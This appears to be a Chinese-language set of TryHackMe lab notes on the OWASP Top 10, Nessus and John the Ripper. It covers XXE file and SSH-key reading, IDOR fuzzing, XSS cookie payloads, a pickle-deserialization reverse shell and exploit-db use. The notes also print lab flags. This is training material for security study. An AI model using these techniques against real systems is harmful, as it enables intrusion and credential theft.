文件符合该 DTD 所描述的规则。 例如：下面给出了一个使用 note.dtd 的 XML 文档 现在让我们来了解 DTD 是如何验证 XML文档信息的，以下是note.dtd文件中的DTD术语的含义（下面的DTD术语和上面的XML文档示例内容存在对应关系）： !DOCTYPE note - 定义名为note 的XML文档根元素（根元素为note） !ELEMENT note - 定义根元素note必须包含子元素：“to, from, heading, body” !ELEMENT to - 将to元素定义为“#PCDATA”类型 !ELEMENT from - 将 from 元素定义为“#PCDATA”类型 !ELEMENT heading - 将heading元素定义为“#PCDATA”类型 !ELEMENT body - 将body元素定义为“#PCDATA”类型 注意：#PCDATA 表示可解析的字符数据。 严重性TOP4 XXE漏洞-XXE Payload 现在我们将查看一些 XXE payload并了解它们是如何工作的。 1.我们将看到的第一个有效载荷非常简单。 如果你掌握前面的知识点，那么你将很容易理解此有效载荷。 正如我们在上例中所看到的，我们首先定义一个名为 name 的 ENTITY (实体)并为其分配一个值feast，并随后在示例代码中使用该ENTITY。 2.我们也可以使用以下XXE payload，通过定义一个ENTITY并让它使用SYSTEM关键字来从目标系统中读取一些文件信息。 同样，在上例中我们定义了一个名为 read 的 ENTITY(实体)，但不同之处在于 我们将其值设置为“SYSTEM”并指定了文件路径。 如果我们使用这个 payload，那么在易受 XXE 攻击的目标网站页面上（通常）就会显示文件/etc/passwd 的内容。我们也可以使用这种有效载荷来尝试读取其他文件信息，但很多时候你可能会读取失败，这也许是因为你所读取的文件本身并不支持以XXE响应消息的方式被查看。 严重性TOP4 XXE漏洞利用 现在让我们使用前文所提到的有效载荷进行XXE漏洞利用。 1.让我们看看如果我们尝试使用payload来显示名称(name)，目标网站将如何响应。 在上图的左侧，我们可以看到一个burp请求：这将向目标站点发送 使用 URL 编码的payload(具体的payload内容见上一小节知识点)；在上图的右侧我们可以看到使用该payload之后，在目标站点的页面上能够成功显示名称(name)值falcon feast。 2.现在让我们尝试读取 /etc/passwd文件内容 能够成功读取(使用的payload同样经过了URL编码，具体的payload内容见上一小节知识点)。 在Linux系统中，用户对应的SSH密钥的默认保存路径为***/home/用户名/.ssh/id_rsa*** ；此处的用户名为falcon，所以路径为/home/falcon/.ssh/id_rsa。 在攻击框中使用XXE payload--用于查看当前用户falcon的私钥内容： falcon的私钥前18个字符：MIIEogIBAAKCAQEA7 。 严重性TOP5 损坏的访问控制 目标网站的某些页面可能会受到保护，从而不允许常规访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问 用于管理其他用户的网站页面；如果目标网站的常规访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于损坏状态。 如果 网站的普通访问者能够访问受保护的页面，可能会导致以下情况： 能够查看目标站点的一些敏感信息。 能够访问目标站点上 未经授权的功能。 OWASP 列出了一些展示访问控制漏洞的攻击场景： 场景#1-在通过web应用程序访问帐户信息的 SQL 调用中注入未经验证的数据： pstmt.setString(1, request.getParameter(&quot;acct&quot;)); ResultSet results = pstmt.executeQuery( ); 攻击者只需修改浏览器URL中的“acct”参数即可发送他们想要访问的任何帐号ID，如果该调用没有经过正确的验证处理，那么攻击者就可以访问任何用户的帐户信息，例： http://example.com/app/accountInfo?acct=notmyacct 场景#2-攻击者强制浏览目标 URL（访问管理页面通常是需要管理员权限的）。 http://example.com/app/getappInfo http://example.com/app/admin_getappInfo 如果未经身份验证的用户可以访问目标站点的任何一个页面，则说明目标网站存在访问控制缺陷；如果非管理员用户可以访问管理页面，也说明目标网站存在访问控制缺陷。 简而言之，损坏的访问控制将允许攻击者绕过授权（即：发生越权操作），这可以让他们像特权用户(此处不单指admin用户，而是指相对于普通用户权限更高的用户)一样查看敏感数据或者执行其他操作。 严重性TOP5 损坏的访问控制（IDOR 练习） IDOR，或者被称为不安全的直接对象引用( Insecure Direct Object Reference)，是一种利用 用户输入处理方式中的错误配置(目标站点方的设置错误)来访问通常无法访问的资源的行为，IDOR 是一种访问控制漏洞。 例子： 假设我们正在登录我们的银行账户，在正确通过身份验证之后，我们被导航至一个URLhttps://example.com/bank?account_number=1234，在该URL对应的网站页面上，我们可以看到自己的银行账户详细信息，并能执行一些常规操作。 然而，这里存在一个潜在的问题，在攻击者将 account_number 参数更改为 1235 等其他内容之后，如果目标站点存在相关的配置错误，那么攻击者就可以访问其他用户所对应的银行账户详细信息。 进行IDOR测试，更改浏览器URL栏中的参数值（修改为：?note=0），尝试访问与其他用户相关的资源并获取flag： 使用FUZZ工具（如wfuzz）进行测试--?note=FUZZ范围设置为0到100即可。 wfuzz -c --hh 0 -z range,0-100 http://10.10.224.32/note.php?note=FUZZ 只有0和1对应的响应码为200。 严重性TOP6 安全配置错误 安全配置错误 安全配置错误与其他OWASP-TOP10漏洞不同，因为它发生在本可以正确配置但未正确配置安全性机制的情况下。 安全配置错误包括： 对云服务（如 S3 存储桶）的权限配置不当。 启用不必要的功能，例如某些服务、页面、帐户或权限。 使用密码未更改的默认帐户。 过于详细的错误消息提示，这将使攻击者可以找到有关目标系统的更多信息。 不使用HTTP安全标头，或在web服务器中透露太多细节：通过HTTP 标头泄露。 此漏洞通常会导致更多漏洞产生，例如允许攻击者使用默认凭据以访问某些敏感数据、允许攻击者执行 发生在admin页面上的 XXE注入或命令注入。 有关安全配置错误的更多信息，建议查看OWASP相关页面： https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html 安全配置错误案例-使用默认密码 应用程序的所有者可以并且也应该去更改该应用程序所使用的默认密码，但他们经常不会这样做。使用默认密码在嵌入式和物联网(IoT-Internet of Things)设备中尤为常见，大多数时候设备的所有者并不会去更改这些密码。 从攻击者的角度看，攻击方很容易尝试利用默认凭据来执行一些本不应该被允许的操作，他们能够访问管理员仪表面板、访问为系统管理员或制造商而设计的某些服务，甚至能够访问网络基础设施--这在针对企业进行攻击时可能非常有用。管理员使用默认凭证的负面影响可能很严重，从敏感信息泄露到 RCE攻击 都有可能发生。 2016 年 10 月，Dyn（一家 DNS 提供商）因过去 10 年最令人难忘的 DDoS 攻击之一而下线，大量恶意流量主要来自物联网设备和网络设备，如路由器、调制解调器，它们在这次DDoS 攻击中被 Mirai 恶意软件感染。 恶意软件是如何接管系统的？ 答案是通过利用默认密码，该恶意软件有一个包含 63 个用户名/密码对的列表，并以此试图登录已经暴露的 telnet 服务。 这次 DDoS 攻击引人注目，因为它使许多大型网站和服务脱机。 Amazon、Twitter、Netflix、GitHub、Xbox Live、PlayStation Network 和更多服务在这场针对 Dyn 的 3 波 DDoS 攻击中被波及以致于离线数小时。 启动目标机器，访问目标站点： 尝试使用以下方法： 1. 通过修改URL，查看目标站点的readme.txt文件 2. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/docs 3. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/documentation 4. 通过修改URL，查看目标站点的changelog.txt文件 5. 通过修改URL，查看目标站点的README.md文件 6. 查看页面源代码中的注释内容、查看页面源代码中的js文件内容...... 7. 利用网页中的关键字，在GitHub上面搜索相关的存储库，找到存储库之后查看README.md文件内容。 8. 使用dirbuster/gobuster进行网站目录爆破 我直接网上搜索 thm{4b9513968fd564a87b28aa1f9d672e17} 严重性TOP7 跨站脚本（XSS漏洞） XSS 概念解释 跨站点脚本，也被称为 XSS，是一种经常能够在 Web 应用程序中被发现的安全漏洞。XSS是一种注入漏洞，攻击者可以构造恶意脚本并能够让该脚本在受害者的机器上被成功执行。 如果 Web 应用程序使用未经过滤的“用户输入”，则该应用程序很容易受到 XSS 攻击。 XSS在 Javascript、VBScript、Flash 和 CSS 中都是可能发生的，跨站点脚本主要分为三种类型： 存储型 XSS - 最危险的 XSS 类型，往往是网站数据库中的恶意字符串的来源；如果网站允许“用户输入”在插入到数据库时未经过清理（删除用户输入的“恶意部分”），则通常会发生这种类型的XSS。 反射型 XSS - 如果XSS Payload是受害者对网站请求的一部分，那么该网站则会包含此payload然后响应用户的请求；总而言之，攻击者需要诱骗受害者点击一个 URL链接来执行攻击者所构造的XSS Payload。 基于 DOM 的 XSS - DOM 指文档对象模型，它是 HTML 和 XML 文档的编程接口，它能代表网站页面，以便程序对文档结构、样式和内容进行更改。你可以将网页理解为一个文档，这个文档可以显示在浏览器窗口中或者作为 HTML 源文件显示。 如需更多关于 XSS 的解释和练习，请查看XSS相关笔记。 XSS Payloads 跨站点脚本是一个漏洞，我们可以利用它在受害者的机器上执行恶意 Javascript，请查看一些常用的XSS Payload类型： 弹消息框 (&lt;script&gt;alert(&quot;Hello World&quot;)&lt;/script&gt;) ：在目标用户的浏览器上创建一个 Hello World 消息弹出窗口。 覆盖 HTML (document.write)：覆盖网站的 HTML 以添加攻击者所输入的内容（基本上破坏了 正常用户对完整页面的阅读体验）。 键盘记录器-XSS Keylogger ( http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html ) ：可用于记录用户的键盘敲击情况，以捕获目标用户在网站页面上所输入的密码信息和其他敏感信息。 端口扫描器-Port scanning ( http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html ) ：一个mini的本地端口扫描器。 XSS-Payloads.com ( http://www.xss-payloads.com/ ) 是一个存储与 XSS 相关的Payload、工具、文档等内容的网站。 你可以在该网站下载XSS Payload，这些XSS Payload能实现 通过网络摄像头拍摄快照，或者实现一些端口扫描器和网络扫描器的相关功能。 注意：http://www.xss-payloads.com/ 网站可能已经失效。 启动目标机器，访问目标站点，完成注册并进行登录： 导航至http://Machine_IP/stored 页面，使用以下XSS Payload（这将插入HTML内容），成功执行Payload之后会得到一个Answer： &lt;p&gt;Hi my name is f9f&lt;/p&gt; 继续使用/stored页面，输入以下XSS Payload（这将弹窗并显示cookie值），成功执行Payload之后会得到一个Answer： &lt;script&gt;alert(document.cookie)&lt;/script&gt; 继续使用/stored页面，输入以下XSS Payload（这将更改HTML页面值），成功执行Payload之后会得到一个Answer，如果没有显示 请自行刷新页面： &lt;script&gt;document.querySelector('#thm-title').textContent = 'I am a hacker'&lt;/script&gt; 严重性TOP8 不安全的反序列化（反序列化漏洞） “不安全的反序列化是一种漏洞，当不受信任的数据被用于滥用应用程序的逻辑时就会发生这种情况”（Acunetix，2017 年） 这个定义还是很宽泛的，简而言之，不安全的反序列化就是用恶意代码替换应用程序将要处理的数据；这将允许发生 DoS（拒绝服务）攻击、RCE（远程代码执行）攻击等一系列的攻击行为，攻击者可以利用不安全的反序列化在渗透测试场景中获得立足点。 具体而言，在不安全的反序列中，恶意代码实际上是利用了 Web 应用程序所使用的合法序列化、反序列化过程；我们稍后将解释这个合法过程以及为什么它在现代 Web 应用程序中如此普遍。 OWASP 将此漏洞评为10位中的第8位(严重程度较低) ，原因如下： 低可利用性。 此漏洞通常视具体情况而定——没有可靠的工具/框架，由于该漏洞性质，攻击者需要很好地了解 ToE 的内部工作原理。 此类漏洞利用仅在攻击者的技能允许时才危险，通常需要关注的问题是：因为该漏洞而暴露的数据的价值。通过反序列化漏洞发起 DoS 攻击的攻击者会使目标应用程序不可用，而DoS攻击对基础设施的业务影响会有所不同——一些组织可能会恢复得很好，而其他组织则可能不会。 什么目标是易受(反序列化漏洞)攻击的？ 在没有对查询或保留的数据进行验证、完整性检查的情况下就存储或获取数据的任何应用程序，都将被视为易受反序列化漏洞影响；有关这种性质的应用程序的几个例子是： 电子商务网站 论坛 API's--应用程序编程接口 应用程序运行时--Application Runtimes（Tomcat、Jenkins、Jboss 等） 严重性TOP8 不安全的反序列化-对象 作为面向对象编程 (OOP：object-oriented programming) 的一个重要元素，对象主要由两部分组成： 状态 行为 简单地说，对象允许你创建相似的代码行，而无需再次编写相同的代码行。 例如，一盏灯将是一个很好的对象，灯可以有 不同类型的灯泡 ，这是它的状态，而灯的 开/关 则是它的行为！你不必考虑每种类型的灯泡以及该特定灯是否打开或关闭，因为你可以使用方法(methods)来简单地改变灯的状态和行为。 严重性TOP8 不安全的反序列化-反序列化 序列化和反序列化 通过类比来学习：一位外国游客在街上向你走来并问路，他正在寻找当地的地标，但他迷路了，不幸的是，中文不是他的强项，而你也不会说他的语言。你会怎么做呢？你可以画一张通往地标的路线图，因为图片跨越了语言障碍，这能够让他成功找到地标。 好的！你刚刚其实就是对一些信息进行了序列化，然后这位迷路的游客则对已被处理的信息进行了反序列化 从而最终找到地标。 简而言之：序列化是将编程中使用的对象转换为更简单、兼容的格式，以便在系统或网络之间传输以进行进一步处理或存储的过程；而反序列化则相反，反序列化能够将序列化信息转换成它们原本的复杂形式——重新变为一个应用程序可以理解的对象。 例： 假设有一个密码字符串“password123”，它来自一个程序，现在我们需要将该密码字符串存储到另一个系统上的数据库中；这是一个在网络中传输数据的过程，因而我们需要将此字符串/输出转换为二进制形式（这是一个序列化过程）以便在网络中进行数据传输。 当然，这个密码最终还是要在目标系统中被存储为“password123”字符串形式而不是其二进制形式；所以，一旦需要被存储的数据到达了目标系统的数据库中，它就需要被转换或反序列化回“password123”字符串（这是一个反序列化过程），以便目标数据库进行存储。 如何利用序列化和反序列化？ 简而言之，当来自不受信任方（即攻击方）的数据没有经过过滤处理或输入验证处理而 被系统执行时，就可能会发生不安全的反序列化；在这种情况下：系统会假定用户所输入的数据是可信的，并且会毫无保留地执行相关的数据内容，从而导致一系列安全风险的产生。 严重性TOP8 不安全的反序列化-Cookies Cookies 是现代网站运行的重要工具之一，是由网站创建并存储在用户的计算机上的微小的数据段。 你会在大多数网站上看到类似上图的通知信息，网站将使用 cookies 来存储特定于用户的行为，例如用户购物车中的商品或会话 ID；在 Web 应用程序中，我们将利用它，你会注意到 cookie 将存储如下登录信息。 虽然使用明文凭据本身就是一种漏洞，但它并不属于不安全的反序列化，因为在使用明文凭据时，我们并未发送任何要执行的序列化数据！ Cookie 不是一个像数据库那样的永久存储解决方案，一些 cookie（例如会话 ID）会在浏览器关闭时被清除，而其他 cookie 则可能会持续相当长的时间；cookie的具体有效时间是由创建 cookie 时所设置的“到期(Expiry)”计时器来决定的。 一些 cookie 有额外的属性，下面是相关的介绍： 创建 Cookie 可以使用各种网站编程语言设置 Cookie，例如Javascript、PHP 或 Python 等等；下面的Web应用是使用Python的Flask开发的，拿它来举例比较合适。 在 Flask 中设置 cookie 相当简单，上图中的代码片段会获取当前日期和时间，并将其存储在变量“timestamp”中，然后将日期和时间存储在名为“registrationTimestamp”的 cookie 中，它在浏览器中的样子为： 严重性TOP8 不安全的反序列化-基于Cookies的练习 访问练习实例 使用已经连接到TryHackMe VPN 的攻击机，通过浏览器导航到 http://MACHINE_IP ，此处将详细介绍使用Firefox浏览器的练习步骤--你可能需要研究如何在其他浏览器中检查 cookie。 访问目标站点之后，你将看到如下主页界面： 让我们创建一个帐户，你可以输入你所喜欢的任何内容。 完成登录行为之后，你将被重定向到个人资料页面，在此页面右侧，你可以看到你的个人详细信息。 检查已编码的数据 你会发现，这些 cookie 既有明文显示的，也有经过 base64 编码的，第一个flag将在其中一个 cookie 中找到。 修改 Cookie 值 请注意，你现在有一个名为“userType”的 cookie，正如你在“myprofile-我的个人资料”页面上的信息所确认的那样，你目前的身份是一名普通用户-user。 此web应用程序会根据你的账户类型来确定你可以看到和不能看到的内容，如果你现在想成为管理员身份该怎么办？你可以尝试修改cookie值！ 左键双击“userType”的“Value”栏，修改内容，让我们将userType的Value更改为“admin”然后导航到 http://MACHINE_IP/admin 以获得第二个flag。 严重性TOP8 不安全的反序列化-代码执行 这是一种比简单地解码 cookie 更加邪恶的攻击，我们将深入了解它的本质。 继续使用上节中的示例进行设置 1、先将cookie中的userType的值从“admin”重新改为“user”，返回 http://MACHINE_IP/myprofile 页面。 2.然后，左键单击下面截图中“Exhange your vim”上的 URL链接。（此处的vim指：Vertical Improved Mail--垂直改进邮件） 3.完成上述操作后，左键单击上图中的“Provide your feedback!--提供您的反馈！”上的 URL链接，你将直接转到下图的页面： 怎样利用以上设置？ 如果用户在表单中输入了他们的反馈信息，则相关数据可能会经过编码处理并发送到 Flask 应用程序（这些数据可能会被存储到数据库中）；但是，发生以上过程的前提条件是：目标应用程序会假定任何已编码的数据都是可信的（此条件在现实环境下可能并不能满足）。 了解下面代码片段中发生的事情很重要： 当你访问“Exchange your vim”URL链接时，一个 cookie 将被编码处理并存储在你的浏览器中 - 我们可以尝试修改！而一旦你访问反馈表单，前述经过编码处理的 cookie 值就会被解码并执行反序列化过程。 在下面的代码片段中，我们可以看到cookie是如何被检索的，并最终通过 pickle.loads 完成反序列化过程。 此漏洞利用了Python中的Pickle，我们可以借此机制尝试建立一个反向 shell。 漏洞利用 1.首先，我们需要在攻击机上设置一个 netcat 监听器。 因为被反序列化的代码来自于 base64 格式的cookie内容，所以我们不能简单地生成一个反向 shell，我们必须使用 base64 对我们需要执行的命令进行编码处理，以便最终能够执行恶意代码。 2.完成监听器的设置后，将 python 文件 (pickelme.py) 中的源代码复制并粘贴到你的攻击机上，修改源代码将“YOUR_TRYHACKME_VPN_IP”替换为你的攻击机所使用的 TryHackMe VPN IP。 3.通过 python3执行“ pickelme.py”并查看命令的输出结果（下图命令中的rce.py即是修改内容之后的pickelme.py） 4.复制并粘贴以上输出结果中的 两个单引号标记（'DATA'）之间的所有内容： 5.将其粘贴到浏览器中的“encodedPayload”cookie值中： 6.确保我们的攻击机上的 netcat 侦听器仍在运行： 7.在个人资料页面 点击提交反馈对应的URL链接(这将触发对cookie值进行反序列化的过程)，在攻击机上将接收到一个反向shell，我们可以通过这个shell界面查看flag.txt文件内容： 严重性TOP9 具有已知漏洞的组件-简介 有时，你可能会发现你正在进行渗透测试的公司所使用的应用程序本身就存在有充分记录的已知漏洞。 例如，假设现在有一家公司已经有几年没有更新他们的 WordPress 版本，通过使用诸如 wpscan 之类的工具进行扫描，你发现了它是 4.6 版本的WordPress，经过调查你会发现 WordPress 4.6 版本容易受到未经身份验证的远程代码执行 (RCE) 攻击，也许你还可以在漏洞利用数据库exploit-db中找到相关的漏洞exp。 正如你所看到的，这将是一件非常具有破坏性的事情，在这种情况下攻击者只需要做很少的工作就能完成攻击，因为目标应用程序的相关漏洞可能已经众所周知，其他攻击者也已经利用过了相关漏洞，所以，如果一家公司错过了他们所使用的应用程序的一次版本更新或者补丁更新，那么他们就可能遭受一些来自不法份子的网络攻击。 OWASP组织将 具有已知漏洞的组件 评级为流行等级3（意思是有较高的流行度），因为在现实情况下，目标公司往往很容易错过对目标应用程序的及时更新。 严重性TOP9 具有已知漏洞的组件-漏洞利用 因为目标应用程序存在已知漏洞的组件，所以大部分攻击工作已经为我们完成了。我们的主要工作是找出目标软件的信息，并对其进行研究，直到找到相关的已知漏洞详情。 接下来，让我们通过一个Web 应用程序示例来了解一下。 假设目标正在使用web服务器-nostromo 的默认页面，那么现在我们知道了目标应用程序的版本号和相关的软件名称，我们可以使用 exploit-db 来尝试找到这个特定版本的nostromo 漏洞。（注意：exploit-db 非常有用，对于网络安全初学者来说，你可能会经常使用它，所以最好熟悉它） 如上图所示，我们找到了一个相关的漏洞利用脚本，让我们下载它并尝试执行代码，然而单独运行这个脚本的结果并未如我们所愿，它会给出如下图所示的报错信息。 有时候，第一次执行exp可能并不会起作用，所以了解脚本相关的编程语言会对我们进行漏洞利用有所帮助，如果需要的话，你可以尝试修复任何exp执行错误或者进行任何exp内容的修改工作，因为 exploit-db 上的很多脚本都需要经过修改才能被成功执行。 幸运的是，在本例中的exp相关错误是由本应被注释的行所引起的，因此我们很容易修复该exp--我们将以下代码行注释即可： 解决以上问题之后，让我们再次尝试运行exp。 我们成功执行了RCE，需要注意的是，大多数exp脚本只会告诉我们需要给它提供哪些参数以便完成漏洞利用过程，exp开发人员很少会让你 为了弄清楚如何使用exp脚本而去阅读数百行代码。 有时你会很容易得到应用程序的版本号，但其他时候你可能还需要挖掘 HTML 源代码，或者需要猜测一个能够被成功使用的漏洞利用脚本；如果目标应用程序的相关漏洞是一个已知漏洞，则总有办法可以尝试发现目标应用程序所运行的版本信息。 严重性TOP9 具有已知漏洞的组件-实验 实验：现在有一个易受攻击的应用程序，我们已知该目标具有已知漏洞的组件，我们需要通过公开的信息完成整个漏洞利用过程。 在 https://www.exploit-db.com/ 搜索目标应用程序，点击下载即可： 在攻击机上使用exp，指定目标url参数： python 47887.py http://10.10.52.29/ 严重性TOP10 日志记录和监控不足 在设置 Web 应用程序时，应该记录用户执行的每个操作，这些日志记录很重要，因为在发生安全事件时，日志可以用于跟踪攻击者的行为；一旦追踪到攻击者的行为，就可以确定他们所进行的行为的安全风险和安全影响。 如果没有日志记录，就无法判断攻击者在获得对特定 Web 应用程序的访问权限之后 具体执行了哪些操作，其中更大的影响包括： 监管损失：如果攻击者获得了对用户个人身份信息的访问权限并且没有留下日志记录，不仅应用程序的用户本身会受到安全影响，该应用程序的所有者也可能会按照当地法律法规受到罚款或其他更严厉的处罚。 进一步攻击的风险：如果目标应用程序不进行日志记录，则可能无法检测到攻击者的存在，这可能会允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步的攻击。 日志中存储的信息应包括： HTTP status codes（HTTP状态码） Time Stamps（时间戳） Usernames（用户名） API endpoints/page locations（API 端点/页面 位置） IP addresses（IP地址） 这些日志确实包含一些敏感信息，因此确保安全存储日志并将这些日志的多个副本存储在不同位置非常重要。 你可能已经注意到，在发生网络安全违规或事件后，日志记录显得尤为重要。理想的情况是 目标应用程序能够进行行为监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时（如：在攻击者入侵十天之后才检测到）尽可能地减少攻击者所造成的影响。可疑活动的常见示例包括： 多次未经授权的特定操作尝试：通常是身份验证尝试或者访问未经授权的资源--例如管理员页面。 来自异常 IP 地址或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户，注意：具有一定误报率。 使用自动化工具：特定的自动化工具可以很容易地被目标应用程序所识别，例如，检测用户所使用的 User-Agent 标头的值或用户发出请求的速度，这些特征可能表明攻击者正在使用自动化工具。 常见有效载荷（Payload）：在 Web 应用程序中，攻击者可能会使用跨站点脚本 (XSS)等一系列有效载荷，通过检测这些有效载荷的使用情况 就可以得知是否有人在对目标应用程序进行未经授权/恶意测试。 仅仅检测可疑活动还不够，还需要根据影响级别对这种可疑活动进行评级；某些攻击行为会比其他攻击行为产生更大的影响，这些影响较大的行动需要优先做应急响应处理，因此应该针对性地发出告警，以引起相关管理方的注意。 接下来，我们需要通过分析示例日志文件来实践本节相关知识点。 下载本小节对应的附件，打开示例日志文件并查看其内容： 不难判断连续四次登录的ip是可疑的IP 每次登录用户名不同推断是暴力破解 ","link":"https://f9f.fun/post/thm-owasp-top-10/"},{"title":"[THM]-Nessus","content":"[THM]-Nessus 简介 Nessus漏洞扫描器就是你想的那样!漏洞扫描器! 它使用类似于Nmap的技术来查找和报告漏洞，然后在一个漂亮的GUI中呈现给我们查看。 Nessus不同于其他扫描仪，因为它在扫描时不做假设， 例如，假设web应用程序在端口80上运行。 Nessus提供免费和付费服务，其中一些功能是免费的，让你更倾向于购买付费服务。 他们的定价与Burp Suite类似，所以除非你有多余的零钱，否则我们将只使用他们的免费版本。 你可以在这里查看他们的定价选项:https://www.tenable.com/products/nessus Nessus安装 官方安装指南：https://docs.tenable.com/nessus/Content/GettingStarted.htm 在Kali虚拟机上安装Nessus 步骤一： 访问网址 https://www.tenable.com/products/nessus/nessus-essentials 注册一个账户（输入用户名称+电子邮箱即可），获取激活码 步骤二： 下载对应版本的Nessus（这里选择Linux-Debian-amd64平台，此平台对于比较新的Kali版本都适用），保存到/Downloads/文件夹（或者其他文件夹） 步骤三： 在终端中，我们将导航到包含刚才所下载文件的文件夹并运行以下命令: You can start Nessus Scanner by typing /bin/systemctl start nessusd.service Then go to https://f9f:8834/ to configure your scanner 步骤四： 现在我们将用以下命令启动 Nessus 服务: sudo /bin/systemctl start nessusd.service 步骤五： 打开网站访问本地8834端口： 接受风险 步骤六： 接下来，我们将设置扫描器，选择Nessus Essentials选项： 填入之前在邮箱中收到的激活码即可： 创建Nessus使用时进行登陆的账户和密码： 步骤八： Nessus 现在将安装运行所需的插件（如果进度条看起来没有移动，这意味着VM上没有足够的空间来安装）。 步骤九： 使用之前设置的账户密码--登陆即可。 Nessus导航和扫描 点击右上角的&quot;New Scan&quot;按钮，进入到Nessus的导航和扫描界面： 策略页面--允许你创建自定义模板来定义扫描过程中执行的操作。一旦创建好了自定义模版，你就可以从扫描（scan）模板列表中选择它们。从该页面，你可以查看、创建、导入、下载、编辑和删除策略。 插件规则页面--插件规则允许你隐藏或更改任何给定插件的严重性，此外，规则可以限制在特定的主机或特定的时间范围内。你可以从这个页面查看创建、编辑和删除规则。 使用NewScan页面的Host Discovery功能，可以让我们简单地看到哪些主机是存活的。 NewScan页面的 Basic Network Scan是最有用的扫描类型之一，被认为“适用于任何主机”： NewScan页面的 Credentialed Patch Audit扫描允许你“向主机验证并枚举缺失的更新” NewScan页面的Web Application Tests扫描--专门用来扫描 Web 应用程序 运行网络扫描！ 启用靶机并通过Openvpn将kali连接到TryHackMe的靶场内网环境。 本小节将使用Basic Network Scan扫描，开始扫描前先进行选项设置。 在以下界面设置本次扫描的名称和扫描的目标（New Scan button &gt; Basic Network Scan &gt; Settings &gt; BASIC &gt;General）： 可以设置Schedule选项来设定扫描运行的时间（也可以不设置），选择New Scan button &gt; Basic Network Scan &gt; Settings &gt; BASIC &gt; Schedule： 在DISCOVERY里面的扫描类型（Scan Type）中可以选择要扫描的端口，可以设置为全端口扫描、通用端口扫描、自定义端口扫描。 在ADVANCED选项下设置扫描类型为Scan low bandwidth links，使用较低的带宽连接进行扫描： 设置完成之后，保存配置并开始扫描： 等待扫描完成 运行 Web 应用程序扫描！ 现在进行web应用程序扫描，运行此扫描将需要一些时间来完成，请耐心等待！！ 选择New Scan button &gt; Web Application Tests ，在目标文本字段中输入目标机的ip地址，保存设置并启动扫描，最后等待结果即可 ","link":"https://f9f.fun/post/thm-nessus/"},{"title":"[THM]-John The Ripper","content":"[THM]-John The Ripper 约翰是谁? 欢迎 开膛手约翰是最著名、最受欢迎和最通用的散列破解工具之一。它结合了快速的破解速度，以及非常广泛的兼容哈希类型。这个房间将假定没有以前的知识，所以我们必须首先涵盖一些基本的术语和概念，然后我们进入实际的哈希破解。 哈希值是什么? 哈希是一种获取任意长度的数据并以固定长度的另一种形式表示它的方法。这掩盖了数据的原始值。这是通过散列算法运行原始数据来完成的。有许多流行的散列算法，如MD4、MD5、SHA1和NTLM。让我们试着用一个例子来说明这一点: 如果我们取“polo”，一个4个字符的字符串，并通过MD5哈希算法运行它，我们最终得到的输出是:b53759f3ce692de7aff1b5779d3964da，一个标准的32个字符的MD5哈希。 同样，如果我们取“polomints”，一个9个字符的字符串，并通过相同的MD5哈希算法运行它，我们最终得到的输出是:584b6e4f4586e136bc280f27f9c64f3b，另一个标准的32个字符的MD5哈希。 是什么让哈希安全? 哈希算法被设计成只能以一种方式运行。这意味着不能仅使用给定的输出来反转计算过的哈希值。这又回到了一个被称为P对NP关系的基本数学问题。 虽然这是一个非常有趣的数学概念，被证明是计算和密码学的基础，但我没有资格在这里详细解释它;但抽象地说，它意味着哈希值的算法将是“NP”的，因此可以合理地计算。然而，反哈希算法将是“P”，难以解决——这意味着它不能在合理的时间内使用标准计算机计算出来。 约翰来了…… 尽管算法本身是不可逆转的。这并不意味着破解哈希是不可能的。例如，如果你有一个散列版本的密码——你知道散列算法——你可以使用该散列算法对大量的单词进行散列，称为字典。然后，你可以将这些哈希值与你试图破解的哈希值进行比较，看看它们是否匹配。如果是这样，那么您现在就知道与该散列对应的单词了——您已经破解了它! 这个过程被称为字典攻击，开膛手约翰(John the Ripper)是一种工具，可以让你对大量不同哈希类型进行快速蛮力攻击。 学习更多 要了解更多关于特定哈希和加密方法的深入资料，我建议您查看NinjaJc01的惊人房间，其中涵盖了以下主题:encryptioncrypto101 Setting up John the Ripper 陷害开膛手约翰 许多不同的操作系统都支持开膛手约翰，而不仅仅是Linux发行版。在我们详细介绍之前，需要说明的是，John有多个版本，标准的“核心”发行版，以及多个社区版本——它们扩展了原始John发行版的功能集。这些发行版中最流行的是“Jumbo John”——我们将在后面使用它的特定特性。 鹦鹉，卡莉和攻击箱 如果你使用的是Parrot OS、Kali Linux或TryHackMe自己的AttackBox，你应该已经安装了Jumbo John。您可以通过在终端中输入john来再次检查。您应该看到john的使用指南，第一行是:“john the Ripper 1.9.0-jumbo-1”或类似的版本号。如果没有，可以使用sudo apt install john来安装它。 Blackarch 如果您正在使用Blackarch，或者Blackarch存储库中是否安装了Jumbo John，请使用pacman -Qe | grep &quot; John &quot;命令检查是否安装了，您应该会看到类似于&quot; John 1.9.0 &quot;的输出。Jumbo1-5”或类似的版本号不同。如果您没有安装它，您可以简单地使用pacman -S john来安装它。 从源代码构建Linux 如果您希望从源代码构建包以满足您的系统需求，您可以通过五个相当简单的步骤来完成。关于安装过程和如何配置从源代码构建的进一步建议可以在这里找到。 使用git clone https://github.com/openwall/john -b bleeding-jumbo john将jumbo john存储库克隆到您当前的工作中 然后cd john/src/将当前目录更改为源代码所在的目录。 进入该目录后，使用./configure来检查所需的依赖项和已配置的选项。 如果您对这个输出感到满意，并且已经安装了所需的依赖项，那么可以使用make -s clean &amp;&amp; make -sj4来构建john的二进制文件。该二进制文件将位于上述运行目录中，您可以使用cd ../run将其更改为该目录 您可以使用./john——test测试这个二进制文件 Windows安装 要在Windows上安装“开膛手江伯约翰”，你只需要下载并安装64位系统或32位系统的压缩二进制文件。 64here32 here. 字典wordlists 单词表 正如我们在第一个任务中解释的那样，为了字典攻击哈希，您需要一个可以哈希和比较的单词列表，不出所料，这被称为单词列表。有许多不同的单词列表，在SecLists存储库中可以找到一个很好的集合。在你选择的攻击系统中，有几个地方可以找到词表，我们将快速浏览一下你可以找到它们的地方。 鹦鹉，卡莉和攻击箱 